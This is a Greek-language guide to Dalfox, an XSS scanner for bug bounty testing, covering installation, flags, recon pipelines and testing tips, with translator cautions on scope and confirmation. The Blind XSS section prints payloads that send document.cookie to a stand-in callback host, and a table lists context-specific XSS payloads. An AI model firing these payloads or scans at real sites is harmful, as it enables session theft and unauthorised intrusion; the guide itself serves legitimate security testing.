# 🦊 Dalfox — Εργαλείο ελέγχων XSS

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Εργαλείο ανάλυσης και δοκιμών XSS
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
<a href="../README.md">🇬🇧 English</a> • <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a>
</p>

---

## Πριν ξεκινήσετε

Το **Dalfox** βοηθά στην αναζήτηση **XSS (Cross-Site Scripting)**: περιπτώσεων όπου είσοδος χρήστη οδηγεί σε εκτέλεση JavaScript στο περιβάλλον ιστοσελίδας. Εξετάζει παραμέτρους, σημεία αντανάκλασης και πιθανά payloads.

**Βασικοί όροι:** *payload* = δοκιμαστική είσοδος, *reflection* = εμφάνιση εισόδου στην απόκριση, *context* = σημείο ερμηνείας, π.χ. HTML ή JavaScript, *blind XSS* = εκτέλεση σε περιβάλλον που δεν βλέπετε άμεσα, *callback* = επικοινωνία προς υπηρεσία παρατήρησης.

Η αντανάκλαση δεν αποδεικνύει εκτέλεση JavaScript. Επιβεβαιώστε το συγκεκριμένο πλαίσιο με μικρή απόδειξη μέσα στους κανόνες του προγράμματος. Τα αρχικά payloads διατηρούνται αυτούσια και δεν εκτελούνται ως μέρος της μετάφρασης.

## 📋 Περιεχόμενα

- [Τι είναι το Dalfox](#section-01)
- [Εγκατάσταση](#section-02)
- [Βασική χρήση](#section-03)
- [Τρόποι ελέγχου](#section-04)
- [Προχωρημένες επιλογές](#section-05)
- [Τυφλό XSS (Blind XSS)](#section-06)
- [Γρήγορη αναφορά](#section-07)
- [Ροές εργασίας Bug Bounty](#section-08)
- [Συμβουλές ελέγχων XSS](#section-09)
- [Πηγές](#section-10)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Dalfox

**Το Dalfox** αναλύει παραμέτρους και εκτελεί δοκιμές για πιθανό XSS:

- 🔍 **Ανάλυση παραμέτρων** — εντοπισμός σημείων όπου η είσοδος επιστρέφει στην απόκριση
- 🎯 **Έλεγχοι XSS** — ανακλώμενο XSS και περιπτώσεις στην πλευρά του browser
- 💉 **Blind XSS** — έλεγχοι αλληλεπιδράσεων εκτός άμεσης απόκρισης
- ⚡ **Παράλληλη εκτέλεση** — εργαλείο γραμμένο σε Go

### Δυνατότητες Dalfox

| Χαρακτηριστικό | Χρήση και όφελος |
| --------- | --------- |
| Ανάλυση πλαισίου εισαγωγής | Δοκιμαστικά δεδομένα ανάλογα με το πλαίσιο εμφάνισης |
| Αναγνώριση ενδείξεων φίλτρων WAF | Προσαρμογή δοκιμών όταν εντοπίζονται φίλτρα, χωρίς εγγύηση παράκαμψης |
| Τυφλό XSS (Blind XSS) | Υποστήριξη αλληλεπιδράσεων εκτός άμεσης απόκρισης (OOB) |
| Αναζήτηση υποψήφιων παραμέτρων (Mining) | Αναζήτηση υποψήφιων παραμέτρων από διαθέσιμα δεδομένα |

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

> **Οδηγός της γενιάς v2:** Οι εντολές εγκατάστασης Go και οι λειτουργίες url/file/pipe του πρωτοτύπου αφορούν τη γενιά v2. Η v3 έχει ξαναγραφτεί σε Rust και ενοποιεί τις βασικές σαρώσεις στη λειτουργία scan. Ελέγξτε ποια έκδοση χρησιμοποιείτε· τα αρχικά παραδείγματα δεν πρέπει να θεωρούνται έτοιμα για κάθε νεότερη έκδοση. Δείτε τον [επίσημο οδηγό μετάβασης](https://dalfox.hahwul.com/getting-started/migration/).


```bash
# Εγκατάσταση μέσω Go
go install github.com/hahwul/dalfox/v2@latest

# Εγκατάσταση με Homebrew στο macOS
brew install dalfox

# Εγκατάσταση μέσω Snap σε Linux
sudo snap install dalfox

# Επιβεβαίωση εγκατάστασης
dalfox version
```

---

<a id="section-03"></a>

## 📖 Βασική χρήση

### Ένα URL

```bash
# Βασική σάρωση
dalfox url https://example.com/search?q=test

# Αποθήκευση αποτελεσμάτων
dalfox url https://example.com/search?q=test -o results.txt
```

### Πολλαπλά URL

```bash
# Ανάγνωση από την κανονική είσοδο
cat urls.txt | dalfox pipe

# Από αρχείο
dalfox file urls.txt

# Με παράλληλες εργασίες
cat urls.txt | dalfox pipe -w 50
```

### Περιορισμένη έξοδος

```bash
# Περιορισμένη έξοδος· κάθε αποτέλεσμα εξακολουθεί να χρειάζεται επιβεβαίωση
dalfox url https://example.com/search?q=test --silence

# Χωρίς χρώματα στην έξοδο
dalfox url https://example.com/search?q=test --no-color
```

---

<a id="section-04"></a>

## 🔎 Τρόποι ελέγχου

### Έλεγχος ενός URL

```bash
# Έλεγχος ενός URL
dalfox url https://example.com/page?param=value

# Έλεγχος με σώμα δεδομένων
dalfox url https://example.com/page?param=value -d "post_param=value"
```

### Ανάγνωση από αλυσίδα εντολών

```bash
# Ανάγνωση από την κανονική είσοδο
echo "https://example.com/search?q=test" | dalfox pipe

# Πολλαπλά URL
cat urls_with_params.txt | dalfox pipe
```

### Ανάγνωση από αρχείο

```bash
# Από αρχείο
dalfox file urls.txt

# Με αποθήκευση αποτελεσμάτων
dalfox file urls.txt -o results.txt
```

### Λειτουργία διακομιστή API

> **Ασυμφωνία δείγματος:** Εκκίνηση και επόμενο αίτημα αναφέρουν διαφορετικές θύρες. Διαδρομή API, σώμα και θύρα πρέπει να συμφωνούν με την έκδοση και την πραγματική ρύθμιση.


```bash
# Εκκίνηση διακομιστή API
dalfox server

# Συγκεκριμένη θύρα
dalfox server -p 8080

# Στη συνέχεια στέλνονται αιτήματα API, εφόσον ταιριάζουν στη θύρα και τη μορφή της έκδοσης:
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a id="section-05"></a>

## ⚙️ Προχωρημένες επιλογές

### Προσαρμοσμένες κεφαλίδες HTTP

```bash
# Προσθήκη κεφαλίδας HTTP
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Πολλαπλές κεφαλίδες HTTP
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Cookies και ταυτοποίηση

```bash
# Με cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Βασική ταυτοποίηση HTTP
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

### Προσαρμοσμένα δοκιμαστικά δεδομένα

> **Σημασία του -p:** Επιλέγει παραμέτρους, όχι μεμονωμένο payload. Το αρχικό παράδειγμα με payload ως τιμή δεν κάνει όσα περιγράφει το σχόλιο. Δείτε την [επίσημη χρήση Dalfox](https://dalfox.hahwul.com/reference/cli/).


```bash
# Χρήση δικού σας αρχείου δοκιμαστικών δεδομένων
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Παράδειγμα με -p· στο Dalfox επιλέγει παραμέτρους, όχι κυριολεκτικό payload
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Μορφή δοκιμαστικών δεδομένων στο αρχείο:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

### Μορφές αποτελεσμάτων

> **Μορφή και βεβαιότητα:** Οι επιλογές εμφάνισης PoCs φιλτράρουν την έξοδο. Αξιολογήστε πραγματική εκτέλεση, context και αντίκτυπο πριν υποβάλετε αναφορά. Η εμφάνιση της εισόδου στην απόκριση δεν αρκεί.


```bash
# Έξοδος JSON
dalfox url https://example.com/search?q=test --format json -o result.json

# Εμφάνιση PoC κατά το παράδειγμα, όχι αυτόματη επιβεβαίωση όλων των ευρημάτων
dalfox url https://example.com/search?q=test --only-poc
```

### Απόδοση

```bash
# Ορισμός παράλληλων εργασιών
dalfox url https://example.com/search?q=test -w 100

# Χρονικό όριο σε δευτερόλεπτα
dalfox url https://example.com/search?q=test --timeout 10

# Καθυστέρηση μεταξύ αιτημάτων σε χιλιοστά δευτερολέπτου
dalfox url https://example.com/search?q=test --delay 100
```

### Ρυθμίσεις για φίλτρα WAF

> **Διαφορετική σημασία:** Το skip-mining παραλείπει ανακάλυψη παραμέτρων, όχι γενικά fingerprinting. Επιλογές WAF και προσαρμογής ρυθμού δεν εγγυώνται παράκαμψη ή αφάνεια.


```bash
# Ενεργοποίηση ρυθμίσεων προσαρμογής σε WAF, χωρίς εγγύηση παράκαμψης
dalfox url https://example.com/search?q=test --waf-evasion

# Παράλειψη αναζήτησης παραμέτρων με --skip-mining, όχι γενική απόκρυψη fingerprint
dalfox url https://example.com/search?q=test --skip-mining
```

### Proxy

```bash
# Proxy HTTP
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Χρήση με Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

<a id="section-06"></a>

## 💉 Τυφλό XSS (Blind XSS)

> **Ελάχιστη απόδειξη:** Τα αρχικά payloads περιλαμβάνουν αποστολή document.cookie εκτός εφαρμογής. Μελετήστε τα σε δικό σας εργαστήριο με συνθετικά δεδομένα. Σε πραγματικό έλεγχο ακολουθήστε τους κανόνες για callbacks και τεκμηρίωση. Το HttpOnly εμποδίζει ανάγνωση των αντίστοιχων cookies από JavaScript· κάθε callback χρειάζεται συσχέτιση.


### Χρήση δοκιμαστικών δεδομένων Blind XSS

```bash
# Με XSS Hunter ή Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# Η επιλογή -b ορίζει διεύθυνση αλληλεπίδρασης Blind XSS
```

### Blind XSS με προσαρμοσμένα δεδομένα

```bash
# Προσαρμοσμένα δεδομένα Blind XSS
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

### Παραδείγματα δοκιμαστικών δεδομένων Blind XSS

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

<a id="section-07"></a>

## 📊 Γρήγορη αναφορά

### Βασικές εντολές

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `dalfox url URL` | Έλεγχος ενός URL |
| `dalfox file file.txt` | Έλεγχος στόχων από αρχείο |
| `cat urls \| dalfox pipe` | Ανάγνωση στόχων από την κανονική είσοδο |
| `dalfox server` | Εκκίνηση διακομιστή API |

### Βασικές επιλογές

| Σημαία | Περιγραφή |
| ------ | ------------- |
| `-o file.txt` | Αρχείο εξόδου |
| `-w 50` | Παράλληλες εργασίες |
| `-H "Header: value"` | Προσαρμοσμένη κεφαλίδα |
| `-C "cookie=value"` | Cookie συνεδρίας |
| `-b "url"` | Διεύθυνση καταγραφής εξωτερικής αλληλεπίδρασης Blind XSS |
| `--proxy URL` | Proxy HTTP |
| `--timeout 10` | Χρονικό όριο αιτήματος |

### Επιλογές αποτελεσμάτων

| Σημαία | Περιγραφή |
| ------ | ------------- |
| `--format json` | Έξοδος JSON |
| `--only-poc` | Εμφάνιση δοκιμαστικών τεκμηρίων (PoC) |
| `--silence` | Περιορισμένη έξοδος χωρίς πρόσθετα μηνύματα |
| `--no-color` | Έξοδος χωρίς χρώματα |

### Επιλογές δοκιμαστικών δεδομένων

| Σημαία | Περιγραφή |
| ------ | ------------- |
| `-p "payload"` | Προσαρμοσμένο payload· ελέγξτε τη σημασία της επιλογής |
| `--custom-payload file` | Αρχείο δοκιμαστικών δεδομένων |
| `--waf-evasion` | Ρυθμίσεις προσαρμογής σε WAF, χωρίς εγγύηση παράκαμψης |

---

<a id="section-08"></a>

## 🎯 Ροές εργασίας Bug Bounty

### Βασικός έλεγχος XSS

```bash
# Σύντομη σάρωση
dalfox url "https://target.com/search?q=test" --silence
```

### Έλεγχος από συλλογή URL

```bash
# Συνδυασμός GAU και Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Συνδυασμός Wayback και Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

### Έλεγχος πολλών URL

```bash
# Δοκιμές URL με παραμέτρους· η κάλυψη εξαρτάται από εργαλείο και ρυθμίσεις
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

### Με μοτίβα GF

```bash
# Συνδυασμός GF και Dalfox
gau target.com | gf xss | dalfox pipe --silence

# Με φίλτρο httpx
gau target.com | gf xss | httpx -silent | dalfox pipe
```

### Έλεγχοι με ταυτοποίηση

```bash
# Με στοιχεία συνεδρίας
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

### Συνδυαστική αλυσίδα ελέγχων

```bash
# Συνδυαστική αλυσίδα συλλογής URL και ελέγχων XSS
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

### Δοκιμές Blind XSS

```bash
# Δοκιμές Blind XSS σε λίστα επιτρεπόμενων στόχων
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Παράδειγμα λίστας διαδρομών φορμών
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

<a id="section-09"></a>

## 💡 Συμβουλές ελέγχων XSS

1. **Εξετάστε όλες τις σχετικές παραμέτρους** — ακόμη και όσες δεν είναι εμφανείς
2. **Εξετάστε διαφορετικά πλαίσια** — HTML, JavaScript και γνωρίσματα HTML
3. **Εξετάστε Blind XSS όπου επιτρέπεται** — η απόκριση μπορεί να εμφανίζεται σε διαφορετική περιοχή της εφαρμογής
4. **Εξετάστε αν συνδέεται με ανακατεύθυνση** — η πρόσθετη επίπτωση χρειάζεται ξεχωριστή τεκμηρίωση
5. **Εξετάστε τις κεφαλίδες απόκρισης** — κυρίως την CSP· η παλιά X-XSS-Protection δεν αποτελεί σύγχρονη εγγύηση προστασίας
6. **Εξετάστε παραμέτρους POST** — μπορεί να διαφέρουν από τις παραμέτρους GET

### Συνήθη σημεία εισαγωγής δεδομένων για έλεγχο XSS

```
- Πεδία αναζήτησης
- Πεδία προφίλ χρήστη
- Σχόλια και φόρμες ανατροφοδότησης
- Παράμετροι URL
- Κεφαλίδες HTTP (Referer, User-Agent)
- Ονόματα μεταφορτωμένων αρχείων
- Μηνύματα σφάλματος
```

### Δοκιμαστικά δεδομένα ανά πλαίσιο

| Πλαίσιο εισαγωγής | Payload |
| --------- | --------- |
| HTML | `<script>alert(1)</script>` |
| Γνώρισμα HTML | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| Διεύθυνση ιστού (URL) | `javascript:alert(1)` |

---

<a id="section-10"></a>

## 📚 Πηγές

- [Αποθετήριο Dalfox στο GitHub](https://github.com/hahwul/dalfox)
- [Παραδείγματα δοκιμαστικών δεδομένων XSS](https://github.com/payloadbox/xss-payload-list)

### Σχετικοί οδηγοί
- [Μεθοδολογία Bug Bounty](../../Bug-Bounty-Methodology/translations/README.el.md)
- [Παραδείγματα δοκιμαστικών δεδομένων XSS](../../Payloads/translations/XSS.el.md)
- [Burp Suite](../../Burp-Suite/translations/README.el.md)

---

<p align="center">
  <b>🦊 Εξετάστε πιθανές ευπάθειες XSS!</b><br>
  <i>Dalfox — ανάλυση και δοκιμές XSS</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
